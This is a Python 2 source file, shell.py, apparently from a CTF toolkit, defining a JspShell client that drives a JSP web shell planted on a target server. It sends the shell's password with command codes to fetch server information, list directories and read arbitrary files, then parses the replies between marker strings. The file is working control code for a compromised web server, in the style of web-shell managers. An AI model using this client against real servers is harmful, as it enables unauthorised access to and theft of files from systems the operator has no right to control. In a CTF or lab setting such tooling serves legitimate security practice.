# coding=utf-8

"""
@version: 1.0
@author: chaowei
@file: shell.py
@time: 2018/2/18 16:52
"""
import requests
import config

import sys

sys.path.append("C:\Users\laochao\Desktop\CTF\SourceCode\YNM3000\src")

class JspShell:

    def __init__(self,shellEntity):
        self.shellEntity=shellEntity

    def parseResponse(self,response):
        if config.SPLIT_SYMBOL_LEFT in response and config.SPLIT_SYMBOL_RIGHT in response:
            return response[response.find(config.SPLIT_SYMBOL_LEFT)+len(config.SPLIT_SYMBOL_LEFT):response.find(config.SPLIT_SYMBOL_RIGHT)]
        else:
            return 'Error://no symbol'

    def getStart(self):
        payload = {self.shellEntity.shell_password: 'A'}
        r=requests.post(self.shellEntity.shell_address,payload)
        print r.text
        return self.parseResponse(r.text)

    def getDirectoryContent(self,path):
        payload = {self.shellEntity.shell_password: 'B','z1':path}
        r = requests.post(self.shellEntity.shell_address, payload)
        print r.text
        return self.parseResponse(r.text)

    def getFileContent(self,path):
        payload = {self.shellEntity.shell_password: 'C', 'z1': path}
        r = requests.post(self.shellEntity.shell_address, payload)
        print r.text
        return self.parseResponse(r.text)